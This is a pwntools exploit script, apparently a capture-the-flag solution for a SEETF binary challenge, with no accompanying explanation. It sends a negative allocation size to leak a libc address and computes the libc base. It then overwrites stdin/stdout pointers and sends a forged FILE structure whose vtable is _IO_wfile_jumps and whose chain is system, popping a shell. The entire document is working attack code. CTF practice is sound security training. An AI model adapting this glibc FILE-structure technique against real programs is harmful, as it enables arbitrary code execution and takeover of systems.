from pwn import *

context.binary = libc = ELF("libc.so.6")
p = process("./chall_patched")
#p = remote("win.the.seetf.sg", 2003)

p.sendlineafter(b"allocate?\n", b"-4000000000")
p.sendlineafter(b"(1-3)\n", b"1")
p.recvuntil(b"chunk @ ")
leak = int(p.recvline().strip(), 16)
libc.address = leak + 294981616

log.info(f"leak @ {hex(leak)}")
log.info(f"libc base @ {hex(libc.address)}")

p.sendlineafter(b"Content: ", b"just for lols")
#gdb.attach(p)

p.sendlineafter(b"Content: ", b"A"*8 + p64(libc.sym._IO_2_1_stdin_-1)*3 + b"A"*24 + p64(libc.sym._IO_2_1_stdout_) + b"B"*0x318 + p64(libc.sym._IO_2_1_stdin_))

standard_FILE_addr = libc.sym._IO_2_1_stdin_

fs = FileStructure()
fs.flags = unpack("  " + "sh".ljust(6, "\x00"), 64)  
fs._IO_write_base = 0
fs._IO_write_ptr = 1
# fs._mode = 0
fs._lock = standard_FILE_addr-0x10
fs.chain = libc.sym.system
fs._codecvt = standard_FILE_addr
fs._wide_data = standard_FILE_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

p.send(bytes(fs))
p.sendline(b"A"*0x100)

p.interactive()
